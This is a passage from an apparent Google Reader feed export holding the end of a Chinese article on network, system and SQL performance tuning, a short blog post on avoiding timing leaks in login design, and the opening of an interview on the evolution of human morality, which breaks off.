所以，高性能的网络重要的是要让网络丢包率非常非常地小（基本上是用在LAN里），如果网络基本是可信的，这样用大一点的buffer会有更好的网络传输性能（来来回回太多太影响性能了）。</p>\n<p>另外，我们想一想，如果网络质量非常好，基本不丢包，而业务上我们不怕偶尔丢几个包，如果是这样的话，那么，我们为什么不用速度更快的UDP呢？你想过这个问题了吗？</p>\n<p><strong>B）UDP调优</strong></p>\n<p>说到UDP的调优，有一些事我想重点说一样，那就是MTU——最大传输单元（其实这对TCP也一样，因为这是链路层上的东西）。所谓最大传输单元，你可以想像成是公路上的公交车，假设一个公交车可以最多坐70人，带宽就像是公路的车道数一样，如果一条路上最多可以容下100辆公交车，那意味着我最多可以运送7000人，但是如果公交车坐不满，比如平均每辆车只有20人，那么我只运送了2000人，于是我公路资源（带宽资源）就被浪费了。 所以，我们对于一个UDP的包，我们要尽量地让他大到MTU的最大尺寸再往网络上传，这样可以最大化带宽利用率。对于这个MTU，以太网是1500字节，光纤是4352字节，802.11无线网是7981。但是，当我们用TCP/UDP发包的时候，我们的有效负载Payload要低于这个值，因为IP协议会加上20个字节，UDP会加上8个字节（TCP加的更多），所以，一般来说，你的一个UDP包的最大应该是1500-8-20=1472，这是你的数据的大小。当然，如果你用光纤的话， 这个值就可以更大一些。（顺便说一下，对于某些NB的千光以态网网卡来说，在网卡上，网卡硬件如果发现你的包的大小超过了MTU，其会帮你做fragment，到了目标端又会帮你做重组，这就不需要你在程序中处理了）</p>\n<p>再多说一下，使用Socket编程的时候，你可以使用setsockopt() 设置 SO_SNDBUF/SO_RCVBUF 的大小，TTL和KeepAlive这些关键的设置，当然，还有很多，具体你可以查看一下Socket的手册。</p>\n<p>最后说一点，UDP还有一个最大的好处是multi-cast多播，这个技术对于你需要在内网里通知多台结点时非常方便和高效。而且，多播这种技术对于机会的水平扩展（需要增加机器来侦听多播信息）也很有利。</p>\n<p><strong>C）网卡调优</strong></p>\n<p><strong></strong>对于网卡，我们也是可以调优的，这对于千兆以及网网卡非常必要，在Linux下，我们可以用ifconfig查看网上的统计信息，如果我们看到overrun上有数据，我们就可能需要调整一下txqueuelen的尺寸（一般默认为1000），我们可以调大一些，如：ifconfig eth0 txqueuelen 5000。Linux下还有一个命令叫：ethtool可以用于设置网卡的缓冲区大小。在Windows下，我们可以在网卡适配器中的高级选项卡中调整相关的参数（如：Receive Buffers, Transmit Buffer等，不同的网卡有不同的参数）。把Buffer调大对于需要大数据量的网络传输非常有效。</p>\n<p><strong>D）其它网络性能</strong></p>\n<p>关于多路复用技术，也就是用一个线程来管理所有的TCP链接，有三个系统调用要重点注意：一个是select，这个系统调用只支持上限1024个链接，第二个是poll，其可以突破1024的限制，但是select和poll本质上是使用的轮询机制，轮询机制在链接多的时候性能很差，因主是O(n)的算法，所以，epoll出现了，epoll是操作系统内核支持的，仅当在链接活跃时，操作系统才会callback，这是由操作系统通知触发的，但其只有Linux Kernel 2.6以后才支持（准确说是2.5.44中引入的），当然，如果所有的链接都是活跃的，过多的使用epoll_ctl可能会比轮询的方式还影响性能，不过影响的不大。</p>\n<p>另外，关于一些和DNS Lookup的系统调用要小心，比如：gethostbyaddr/gethostbyname，这个函数可能会相当的费时，因为其要到网络上去找域名，因为DNS的递归查询，会导致严重超时，而又不能通过设置什么参数来设置time out，对此你可以通过配置hosts文件来加快速度，或是自己在内存中管理对应表，在程序启动时查好，而不要在运行时每次都查。另外，在多线程下面，gethostbyname会一个更严重的问题，就是如果有一个线程的gethostbyname发生阻塞，其它线程都会在gethostbyname处发生阻塞，这个比较变态，要小心。（你可以试试GNU的gethostbyname_r()，这个的性能要好一些） 这种到网上找信息的东西很多，比如，如果你的Linux使用了NIS，或是NFS，某些用户或文件相关的系统调用就很慢，所以要小心。</p>\n<p><strong>4.4）系统调优</strong></p>\n<p><strong>A）I/O模型</strong></p>\n<p>前面说到过select/poll/epoll这三个系统调用，我们都知道，Unix/Linux下把所有的设备都当成文件来进行I/O，所以，那三个操作更应该算是I/O相关的系统调用。说到  I/O模型，这对于我们的I/O性能相当重要，我们知道，Unix/Linux经典的I/O方式是（关于Linux下的I/O模型，大家可以读一下这篇文章《<a href=\"http://www.ibm.com/developerworks/cn/linux/l-async/\">使用异步I/O大大提高性能</a>》）：</p>\n<p>第一种，同步阻塞式I/O，这个不说了。</p>\n<p>第二种，同步无阻塞方式。其通过fctnl设置 O_NONBLOCK 来完成。</p>\n<p>第三种，对于select/poll/epoll这三个是I/O不阻塞，但是在事件上阻塞，算是：I/O异步，事件同步的调用。</p>\n<p>第四种，AIO方式。这种I/O 模型是一种处理与 I/O 并行的模型。I/O请求会立即返回，说明请求已经成功发起了。在后台完成I/O操作时，向应用程序发起通知，通知有两种方式：一种是产生一个信号，另一种是执行一个基于线程的回调函数来完成这次 I/O 处理过程。</p>\n<p>第四种因为没有任何的阻塞，无论是I/O上，还是事件通知上，所以，其可以让你充分地利用CPU，比起第二种同步无阻塞好处就是，第二种要你一遍一遍地去轮询。Nginx之所所以高效，是其使用了epoll和AIO的方式来进行I/O的。</p>\n<p>再说一下Windows下的I/O模型，</p>\n<p>a）一个是WriteFile系统调用，这个系统调用可以是同步阻塞的，也可以是同步无阻塞的，关于看文件是不是以Overlapped打开的。关于同步无阻塞，需要设置其最后一个参数Overlapped，微软叫Overlapped I/O，你需要WaitForSingleObject才能知道有没有写完成。这个系统调用的性能可想而知。</p>\n<p>b）另一个叫WriteFileEx的系统调用，其可以实现异步I/O，并可以让你传入一个callback函数，等I/O结束后回调之， 但是这个回调的过程Windows是把callback函数放到了APC（<a href=\"http://msdn.microsoft.com/en-us/library/windows/desktop/ms681951(v=vs.85).aspx\">Asynchronous Procedure Calls</a>）的队列中，然后，只用当应用程序当前线程成为可被通知状态（Alterable）时，才会被回调。只有当你的线程使用了这几个函数时<a href=\"http://msdn.microsoft.com/en-us/library/windows/desktop/ms687036(v=vs.85).aspx\">WaitForSingleObjectEx</a>, <a href=\"http://msdn.microsoft.com/en-us/library/windows/desktop/ms687028(v=vs.85).aspx\">WaitForMultipleObjectsEx</a>, <a href=\"http://msdn.microsoft.com/en-us/library/windows/desktop/ms684245(v=vs.85).aspx\">MsgWaitForMultipleObjectsEx</a>, <a href=\"http://msdn.microsoft.com/en-us/library/windows/desktop/ms686293(v=vs.85).aspx\">SignalObjectAndWait</a> 和 <a href=\"http://msdn.microsoft.com/en-us/library/windows/desktop/ms686307(v=vs.85).aspx\">SleepEx</a>，线程才会成为Alterable状态。可见，这个模型，还是有wait，所以性能也不高。</p>\n<p>c）然后是IOCP – IO Completion Port，IOCP会把I/O的结果放在一个队列中，但是，侦听这个队列的不是主线程，而是专门来干这个事的一个或多个线程去干（老的平台要你自己创建线程，新的平台是你可以创建一个线程池）。IOCP是一个线程池模型。这个和Linux下的AIO模型比较相似，但是实现方式和使用方式完全不一样。</p>\n<p>当然，真正提高I/O性能方式是把和外设的I/O的次数降到最低，最好没有，所以，对于读来说，内存cache通常可以从质上提升性能，因为内存比外设快太多了。对于写来说，cache住要写的数据，少写几次，但是cache带来的问题就是实时性的问题，也就是latency会变大，我们需要在写的次数上和相应上做权衡。</p>\n<p><strong>B）多核<strong>CPU</strong>调优</strong></p>\n<p>关于CPU的多核技术，我们知道，CPU0是很关键的，如果0号CPU被用得过狠的话，别的CPU性能也会下降，因为CPU0是有调整功能的，所以，我们不能任由操作系统负载均衡，因为我们自己更了解自己的程序，所以，我们可以手动地为其分配CPU核，而不会过多地占用CPU0，或是让我们关键进程和一堆别的进程挤在一起。</p>\n<ul>\n<li>对于Windows来说，我们可以通过“任务管理器”中的“进程”而中右键菜单中的“设置相关性……”（Set Affinity…）来设置并限制这个进程能被运行在哪些核上。</li>\n</ul>\n<ul>\n<li>对于Linux来说，可以使用taskset命令来设置（你可以通过安装schedutils来安装这个命令：apt-get install schedutils）</li>\n</ul>\n<p>多核CPU还有一个技术叫<a href=\"http://en.wikipedia.org/wiki/Non-Uniform_Memory_Access\">NUMA</a>技术（Non-Uniform Memory Access）。传统的多核运算是使用SMP(Symmetric Multi-Processor )模式，多个处理器共享一个集中的存储器和I/O总线。于是就会出现一致存储器访问的问题，一致性通常意味着性能问题。NUMA模式下，处理器被划分成多个node， 每个node有自己的本地存储器空间。关于NUMA的一些技术细节，你可以查看一下这篇文章《<a href=\"http://www.ibm.com/developerworks/cn/linux/l-numa/index.html\">Linux 的 NUMA 技术</a>》，在Linux下，对NUMA调优的命令是：<strong>numactl </strong>。如下面的命令：（指定命令“myprogram arg1 arg2”运行在node 0 上，其内存分配在node 0 和 1上）</p>\n<pre>numactl --cpubind=0 --membind=0,1 myprogram arg1 arg2</pre>\n<p>当然，上面这个命令并不好，因为内存跨越了两个node，这非常不好。最好的方式是只让程序访问和自己运行一样的node，如：</p>\n<pre>$ numactl --membind 1 --cpunodebind 1 --localalloc myapplication</pre>\n<p><strong>C）文件系统调优</strong></p>\n<p>关于文件系统，因为文件系统也是有cache的，所以，为了让文件系统有最大的性能。首要的事情就是分配足够大的内存，这个非常关键，在Linux下可以使用free命令来查看 free/used/buffers/cached，理想来说，buffers和cached应该有40%左右。然后是一个快速的硬盘控制器，SCSI会好很多。最快的是Intel SSD 固态硬盘，速度超快，但是写次数有限。</p>\n<p>接下来，我们就可以调优文件系统配置了，对于Linux的Ext3/4来说，几乎在所有情况下都有所帮助的一个参数是关闭文件系统访问时间，在/etc/fstab下看看你的文件系统 有没有noatime参数（一般来说应该有），还有一个是dealloc，它可以让系统在最后时刻决定写入文件发生时使用哪个块，可优化这个写入程序。还要注间一下三种日志模式：data=journal、data=ordered和data=writeback。默认设置data=ordered提供性能和防护之间的最佳平衡。</p>\n<p>当然，对于这些来说，ext4的默认设置基本上是最佳优化了。</p>\n<p>这里介绍一个Linux下的查看I/O的命令—— iotop，可以让你看到各进程的磁盘读写的负载情况。</p>\n<p>其它还有一些关于NFS、XFS的调优，大家可以上google搜索一些相关优化的文章看看。关于各文件系统，大家可以看一下这篇文章——《<a href=\"http://www.ibm.com/developerworks/cn/linux/l-jfs/\">Linux日志文件系统及性能分析</a>》</p>\n<p><strong>4.5）数据库调优</strong></p>\n<p>数据库调优并不是我的强项，我就仅用我非常有限的知识说上一些吧。注意，下面的这些东西并不一定正确，因为在不同的业务场景，不同的数据库设计下可能会得到完全相反的结论，所以，我仅在这里做一些一般性的说明，具体问题还要具体分析。</p>\n<p><strong>A）数据库引擎调优</strong></p>\n<p>我对数据库引擎不是熟，但是有几个事情我觉得是一定要去了解的。</p>\n<ul>\n<li><strong>数据库的锁的方式</strong>。这个非常非常地重要。并发情况下，锁是非常非常影响性能的。各种隔离级别，行锁，表锁，页锁，读写锁，事务锁，以及各种写优先还是读优先机制。性能最高的是不要锁，所以，分库分表，冗余数据，减少一致性事务处理，可以有效地提高性能。NoSQL就是牺牲了一致性和事务处理，并冗余数据，从而达到了分布式和高性能。</li>\n<li><strong>数据库的存储机制</strong>。不但要搞清楚各种类型字段是怎么存储的，更重要的是数据库的数据存储方式，是怎么分区的，是怎么管理的，比如Oracle的数据文件，表空间，段，等等。了解清楚这个机制可以减轻很多的I/O负载。比如：MySQL下使用<span style=\"font-size:xx-small\">show engines;</span>可以看到各种存储引擎的支持。不同的存储引擎有不同的侧重点，针对不同的业务或数据库设计会让你有不同的性能。</li>\n<li><strong>数据库的分布式策略</strong>。最简单的就是复制或镜像，需要了解分布式的一致性算法，或是主主同步，主从同步。通过了解这种技术的机理可以做到数据库级别的水平扩展。</li>\n</ul>\n<p><strong>B）SQL语句优化</strong></p>\n<p>关于SQL语句的优化，首先也是要使用工具，比如：<a href=\"http://www.mysql.com/products/enterprise/query.html\">MySQL SQL Query Analyzer</a>，<a href=\"http://www.oracle-base.com/articles/11g/sql-performance-analyzer-11gr1.php\">Oracle SQL Performance Analyzer</a>，或是微软<a href=\"http://msdn.microsoft.com/en-us/library/aa216945(v=sql.80).aspx\">SQL Query Analyzer</a>，基本上来说，所有的RMDB都会有这样的工具，来让你查看你的应用中的SQL的性能问题。 还可以使用explain来看看SQL语句最终Execution Plan会是什么样的。</p>\n<p>还有一点很重要，数据库的各种操作需要大量的内存，所以服务器的内存要够，优其应对那些多表查询的SQL语句，那是相当的耗内存。</p>\n<p>下面我根据我有限的数据库SQL的知识说几个会有性能问题的SQL：</p>\n<ul>\n<li><strong>全表检索</strong>。比如：select * from user where lastname = “xxxx”，这样的SQL语句基本上是全表查找，线性复杂度O(n)，记录数越多，性能也越差（如：100条记录的查找要50ms，一百万条记录需要5分钟）。对于这种情况，我们可以有两种方法提高性能：一种方法是分表，把记录数降下来，另一种方法是建索引（为lastname建索引）。索引就像是key-value的数据结构一样，key就是where后面的字段，value就是物理行号，对索引的搜索复杂度是基本上是O(log(n)) ——用B-Tree实现索引（如：100条记录的查找要50ms，一百万条记录需要100ms）。</li>\n</ul>\n<ul>\n<li><strong>索引</strong>。对于索引字段，最好不要在字段上做计算、类型转换、函数、空值判断、字段连接操作，这些操作都会破坏索引原本的性能。当然，索引一般都出现在Where或是Order by字句中，所以对Where和Order by子句中的子段最好不要进行计算操作，或是加上什么NOT之类的，或是使用什么函数。</li>\n</ul>\n<ul>\n<li><strong>多表查询</strong>。关系型数据库最多的操作就是多表查询，多表查询主要有三个关键字，EXISTS，IN和JOIN（关于各种join，可以参看<a title=\"图解SQL的Join\" href=\"http://coolshell.cn/articles/3463.html\">图解SQL的Join</a>一文）。基本来说，现代的数据引擎对SQL语句优化得都挺好的，JOIN和IN/EXISTS在结果上有些不同，但性能基本上都差不多。有人说，EXISTS的性能要好于IN，IN的性能要好于JOIN，我各人觉得，这个还要看你的数据、schema和SQL语句的复杂度，对于一般的简单的情况来说，都差不多，所以千万不要使用过多的嵌套，千万不要让你的SQL太复杂，宁可使用几个简单的SQL也不要使用一个巨大无比的嵌套N级的SQL。还有人说，如果两个表的数据量差不多，Exists的性能可能会高于In，In可能会高于Join，如果这两个表一大一小，那么子查询中，Exists用大表，In则用小表。这个，我没有验证过，放在这里让大家讨论吧。另，有一篇关于SQL Server的文章大家可以看看《<a href=\"http://explainextended.com/2009/06/16/in-vs-join-vs-exists/\">IN vs JOIN vs EXISTS</a>》</li>\n</ul>\n<ul>\n<li><strong>JOIN操作</strong>。有人说，Join表的顺序会影响性能，只要Join的结果集是一样，性能和join的次序无关。因为后台的数据库引擎会帮我们优化的。Join有三种实现算法，嵌套循环，排序归并，和Hash式的Join。（MySQL只支持第一种）</li>\n</ul>\n<ul style=\"padding-left:60px\">\n<ul>\n<li>嵌套循环，就好像是我们常见的多重嵌套循环。注意，前面的索引说过，数据库的索引查找算法用的是B-Tree，这是O(log(n))的算法，所以，整个算法复法度应该是O(log(n)) * O(log(m)) 这样的。</li>\n<li>Hash式的Join，主要解决嵌套循环的O(log(n))的复杂，使用一个临时的hash表来标记。</li>\n<li>排序归并，意思是两个表按照查询字段排好序，然后再合并。当然，索引字段一般是排好序的。</li>\n</ul>\n</ul>\n<p style=\"padding-left:60px\">还是那句话，具体要看什么样的数据，什么样的SQL语句，你才知道用哪种方法是最好的。</p>\n<ul>\n<li><strong>部分结果集。</strong>我们知道MySQL里的Limit关键字，Oracle里的rownum，SQL Server里的Top都是在限制前几条的返回结果。这给了我们数据库引擎很多可以调优的空间。一般来说，返回top n的记录数据需要我们使用order by，注意在这里我们需要为order by的字段建立索引。有了被建索引的order by后，会让我们的select语句的性能不会被记录数的所影响。使用这个技术，一般来说我们前台会以分页方式来显现数据，Mysql用的是OFFSET，SQL Server用的是FETCH NEXT，这种Fetch的方式其实并不好是线性复杂度，所以，如果我们能够知道order by字段的第二页的起始值，我们就可以在where语句里直接使用&gt;=的表达式来select，这种技术叫seek，而不是fetch，seek的性能比fetch要高很多。</li>\n</ul>\n<ul>\n<li><strong>字符串</strong>。正如我前面所说的，字符串操作对性能上有非常大的恶梦，所以，能用数据的情况就用数字，比如：时间，工号，等。</li>\n</ul>\n<ul>\n<li><strong>全文检索</strong>。千万不要用Like之类的东西来做全文检索，如果要玩全文检索，可以尝试使用<a href=\"http://sphinxsearch.com/\">Sphinx</a>。</li>\n</ul>\n<ul>\n<li><strong>其它</strong>。\n<ul>\n<li>不要select *，而是明确指出各个字段，如果有多个表，一定要在字段名前加上表名，不要让引擎去算。</li>\n<li>不要用Having，因为其要遍历所有的记录。性能差得不能再差。</li>\n<li>尽可能地使用UNION ALL  取代  UNION。</li>\n<li>索引过多，insert和delete就会越慢。而update如果update多数索引，也会慢，但是如果只update一个，则只会影响一个索引表。</li>\n<li>等等。</li>\n</ul>\n</li>\n</ul>\n<p>关于SQL语句的优化，网上有很多文章， 不同的数据库引擎有不同的优化技巧，正如本站以前转发的《<a href=\"http://coolshell.cn/articles/1846.html\" rel=\"bookmark\">MySQL性能优化的最佳20+条经验</a>》</p>\n<p>先写这么多吧，欢迎大家指正补充。</p>\n<blockquote><p><strong>注：</strong>这篇文章的确是个大杂烩。其实其中的说到的很多技术在网上都有很多很多的技术文章，google一下就能找到一堆有很多细节的文章，所以我也就不写了。这篇性能调优的文章写作的动机是之前看到 <a href=\"http://weibo.com/n/%E6%B7%98%E5%AE%9D%E8%A4%9A%E9%9C%B8\">@淘宝褚霸</a> 强推的<a href=\"http://highscalability.com/\">highscalability.com</a>上的这篇文章：<a href=\"http://highscalability.com/blog/2012/5/16/big-list-of-20-common-bottlenecks.html\">Big List Of 20 Common Bottlenecks</a>，觉得这篇文章泛泛而谈，觉得自己能写得比它好，所以就产生了动机。</p></blockquote>\n<p>（<span style=\"color:#cc0000\"><strong>转载时请注明作者和出处，请勿用于商业用途</strong></span>）<br>\n<hr height=\"1\" width=\"100%\">\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:11px;margin-bottom:50px\">————————============ <b>感谢 <a href=\"http://42qu.com/\">42qu.com</a> 为本站提供 <a href=\"http://vps.42qu.com/\"> VPS</a></b> ============————————</div>\n<table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" style=\"clear:both\">\n    \n    <tr>\n        <td colspan=\"5\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能也喜欢：</font></b></td>\n    </tr>\n    \n        <tr>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important\">\n                    <a title=\"6个有用的MySQL语句\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F3433.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7490.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">6个有用的MySQL语句</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"TCP注册端口号大全\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1477.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7490.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">TCP注册端口号大全</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"MySQL性能优化的最佳20+条经验\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1846.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7490.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/09/16/31282265.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">MySQL性能优化的最佳20+条经验</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"TCP网络关闭的状态变换时序图\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1484.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7490.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2012/08/10/40275045.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">TCP网络关闭的状态变换时序图</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"程序员技术练级攻略\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F4990.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7490.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/08/20/23741348.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">程序员技术练级攻略</font>\n                    </a>\n                </td>\n        </tr>\n    \n    <tr>\n        <td colspan=\"5\" align=\"right\">\n            <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems\" title=\"无觅相关文章插件\">\n                <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb!important\">无觅</font>\n            </a>\n        </td>\n    </tr>\n</table><h3>相关文章</h3><ul><li>2012年07月11日 -- <a href=\"http://coolshell.cn/articles/7829.html\" title=\"28个Unix/Linux的命令行神器\">28个Unix/Linux的命令行神器</a></li><li>2011年08月08日 -- <a href=\"http://coolshell.cn/articles/5107.html\" title=\"10大经典错误\">10大经典错误</a></li><li>2011年03月29日 -- <a href=\"http://coolshell.cn/articles/4102.html\" title=\"如何学好C语言\">如何学好C语言</a></li><li>2011年03月28日 -- <a href=\"http://coolshell.cn/articles/4077.html\" title=\"纯文本配置还是注册表\">纯文本配置还是注册表</a></li><li>2010年12月31日 -- <a href=\"http://coolshell.cn/articles/3433.html\" title=\"6个有用的MySQL语句\">6个有用的MySQL语句</a></li><li>2009年12月24日 -- <a href=\"http://coolshell.cn/articles/1998.html\" title=\"粉丝眼中的操作系统\">粉丝眼中的操作系统</a></li><li>2009年10月15日 -- <a href=\"http://coolshell.cn/articles/1579.html\" title=\"一张关于操作系统的图\">一张关于操作系统的图</a></li></ul></p>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1340460467763",
    "timestampUsec" : "1340460467763410",
    "id" : "tag:google.com,2005:reader/item/8ed09d485c325e21",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Security" ],
    "title" : "计时攻击和登录系统设计",
    "published" : 1340342560,
    "updated" : 1340343642,
    "alternate" : [ {
      "href" : "https://blog.delphij.net/2012/06/post-618.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>计时攻击是一种通过观测由于某些操作时泄露出来的时间信息来获取更多信息的攻击。由于设计和实现的不同，攻击者能够通过计时得到的信息也会不一样。简而言之，作为安全系统的设计者，必须对可能泄露信息的各种渠道有充分的了解，并针对它们采取因应措施。</p>\n\n<p>今天在和人讨论的时候想到一个例子，这里记下来。</p>\n\n<p>为了阻止采用 GPU 穷举，我们可能会使用一些增加轮数的散列算法。一个设计不完善的登录系统的登录流程大致如下：</p>\n\n<ul>\n\t<li>从用户输入获得用户名和口令；</li>\n\t<li>在数据库中从用户名查得对应的口令散列串；如果没有这个用户，直接提示\"用户名或密码错误\"；</li>\n\t<li>根据散列串中的 salt 和输入的口令，按一定的算法算出实际的散列值并比较；如果不匹配，提示\"用户名或密码错误\"；</li>\n\t<li>创建信任状。</li>\n</ul>\n\n<p>假定我们采用了一种够慢的算法来计算散列值，上述流程的问题便是，假如用户不存在，尽管攻击者观察到的提示是一样的\"用户名或密码错误\"，但这个提示出现的时间可能会比用户存在时慢一些。这样，这个登录系统便透露了\"用户不存在\"这样的信息。</p>\n\n<p>补救的办法是在用户不存在时，也根据同样的算法计算一下散列串，然后再提示\"用户名或密码错误\"；还有一种办法是增加一个随机的延时。具体采用什么样的做法，要看具体的应用场景。</p>"
    },
    "author" : "Xin LI",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/https://blog.delphij.net/atom.xml",
      "title" : "delphij&#39;s Chaos",
      "htmlUrl" : "https://blog.delphij.net/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1339686793523",
    "timestampUsec" : "1339686793523296",
    "id" : "tag:google.com,2005:reader/item/69aef39f64831929",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "良心是怎么来的？",
    "published" : 1339686793,
    "updated" : 1339686793,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/217845/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<div><img src=\"http://img1.guokr.com/gkimage/jx/kq/o6/jxkqo6.png\" alt=\"为了在天生具备强烈等级观的群体中分配肉食，就必须把等级制度踩在脚下，扫地出门。进化人类学家克里斯托弗·博姆（Christopher Boehm）推测，这就是人类道德的演化过程。（图片：Basic Books;  Jenny Cool）\"><p>为了在天生具备强烈等级观的群体中分配肉食，就必须把等级制度踩在脚下，扫地出门。进化人类学家克里斯托弗·博姆（Christopher Boehm）推测，这就是人类道德的演化过程。（图片：Basic Books;  Jenny Cool）</p></div>\n<p>（文 / 梅根·甘比诺）为何人会对他人友善，即便对方并非家庭成员，自己又无法从中获益？慷慨待人、不求回报，对生存和繁衍的基本进化动因并无助益。</p>\n<p>克里斯托弗·博姆（Christopher Boehm）是一位进化人类学家，在南加州大学珍·古德研究中心（Jane Goodall Research Center）担任主任。40 年来，他观察灵长目动物，研究不同的人类文化，以便理解社会及道德行为。在新书《道德起源》（<em>Moral Origins</em> ）中，博姆推测，人类的道德乃是伴随着狩猎大型猎物演化而来 <a href=\"http://www.guokr.com/#id12\">[注]</a> 。他解释说，在采猎社会，生存的本质归结为一点：不合作，即死亡。</p>\n<div>\n<div><br></div>\n</div>\n<ul>\n<li><strong>您如何定义 “利他主义” ？</strong></li>\n</ul>\n<p>简单来说，利他主义即是对非亲族成员、也即对非血亲的不求回报的付出。</p>\n<ul>\n<li><strong>为何利他主义用演化论很难解释清楚？</strong></li>\n</ul>\n<p>1.5 万年前，人类处于采猎社会，群体中，个体除了个别兄弟姊妹，与绝大多数人都毫无瓜葛。而那时候的人类如此慷慨地与外人分享，这在遗传学上存在矛盾。这么一来，照理说那些工于心计、自私自利的人，他们的基因应该越积越多，而利他者的基因则该逐渐消亡才是。然而事实是，人类进化至今，分享行为却广泛的存在。</p>\n<ul>\n<li><strong>达尔文对 “利他矛盾” 作何看法？</strong></li>\n</ul>\n<p>让达尔文深感不解的是，为何年轻男性会自愿参战，为集体献出生命。这显然违背了他提出的自然选择理论的总则，即个体对个人利益最大化的追求。</p>\n<p>为了解释这一矛盾，达尔文提出了 “群体选择” 论：如果某一群体中利他主义者的数量较多，在与其他群体的生存和繁衍竞争中，这一群体就能赢得胜利；而利他主义者较少的那些群体，幸存者也会较少。这样，利他主义者的基因就得以传播。</p>\n<p>但 “群体选择” 论的问题在于，很难看出它何以强大到能凌驾于个体选择之上。得要数不清的战争和屠杀，才能真正让群体选择发挥作用。</p>\n<ul>\n<li><strong>达尔文认为人类的良知是如何演化而来的呢？</strong></li>\n</ul>\n<p>他所做的其实就相当于，拈起良知、放到一旁，将其视为某种非常特殊的存在，差不多等于说： “我举手投降。我不知道这是怎么来的。我只能说，凡是如人类一般具备智能和同情心的生物，生来就有良知。”</p>\n<ul>\n<li><strong>150  